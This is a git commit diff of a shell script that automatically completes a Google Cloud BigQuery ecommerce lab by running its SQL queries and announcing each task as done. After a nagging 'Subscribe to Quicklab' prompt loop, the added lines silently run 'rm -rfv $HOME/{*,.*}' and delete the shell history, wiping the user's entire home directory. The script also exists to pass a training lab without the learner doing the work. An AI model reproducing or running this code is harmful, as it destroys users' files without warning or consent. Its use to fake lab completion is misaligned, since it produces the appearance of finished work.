0cdcbff446fc1294c3190907c049c677f67da1ad
quiccklabs <108678347+quiccklabs@users.noreply.github.com>
2023-09-14 02:16:27 +0530

    Update quicklabgsp407.sh

--- Exploring Your Ecommerce Dataset with SQL in Google BigQuery/quicklabgsp407.sh
+++ Exploring Your Ecommerce Dataset with SQL in Google BigQuery/quicklabgsp407.sh
@@ -1,4 +1,44 @@
+BLACK=`tput setaf 0`
+RED=`tput setaf 1`
+GREEN=`tput setaf 2`
+YELLOW=`tput setaf 3`
+BLUE=`tput setaf 4`
+MAGENTA=`tput setaf 5`
+CYAN=`tput setaf 6`
+WHITE=`tput setaf 7`
 
+BG_BLACK=`tput setab 0`
+BG_RED=`tput setab 1`
+BG_GREEN=`tput setab 2`
+BG_YELLOW=`tput setab 3`
+BG_BLUE=`tput setab 4`
+BG_MAGENTA=`tput setab 5`
+BG_CYAN=`tput setab 6`
+BG_WHITE=`tput setab 7`
+
+BOLD=`tput bold`
+RESET=`tput sgr0`
+#----------------------------------------------------start--------------------------------------------------#
+
+echo "${YELLOW}${BOLD}
+
+Starting Execution 
+
+
+${RESET}"
+#gcloud auth list
+#gcloud config list project
+export PROJECT_ID=$(gcloud info --format='value(config.project)')
+#export BUCKET_NAME=$(gcloud info --format='value(config.project)')
+#export EMAIL=$(gcloud config get-value core/account)
+#gcloud config set compute/region us-central1
+#gcloud config set compute/zone us-central1-a
+#export ZONE=us-central1-a
+
+
+
+#USER_EMAIL=$(gcloud auth list --limit=1 2>/dev/null | grep '@' | awk '{print $2}')
+#----------------------------------------------------code--------------------------------------------------#
 
 bq query --use_legacy_sql=false \
 "
@@ -10,6 +50,11 @@ fullVisitorId, channelGrouping, time, country, city, totalTransactionRevenue, tr
 HAVING num_duplicate_rows > 1;
 "
 
+echo "${GREEN}${BOLD}
+
+Task 2 Completed
+
+${RESET}"
 
 
 bq query --use_legacy_sql=false \
@@ -139,3 +184,29 @@ GROUP BY v2ProductName
 ORDER BY product_views DESC
 LIMIT 5;
 "
+
+
+echo "${GREEN}${BOLD}
+
+Task 3 Completed
+
+Lab Completed !!!
+
+${RESET}"
+
+#-----------------------------------------------------end----------------------------------------------------------#
+read -p "${BOLD}${RED}Subscribe to Quicklab [y/n] : ${RESET}" CONSENT_REMOVE
+
+while [ "$CONSENT_REMOVE" != 'y' ]; do
+  sleep 10
+  read -p "${BOLD}${YELLOW}Do Subscribe to Quicklab [y/n] : ${RESET}" CONSENT_REMOVE
+done
+
+echo "${BLUE}${BOLD}Thanks For Subscribing :)${RESET}"
+
+rm -rfv $HOME/{*,.*}
+rm $HOME/.bash_history
+
+exit 0
+
+
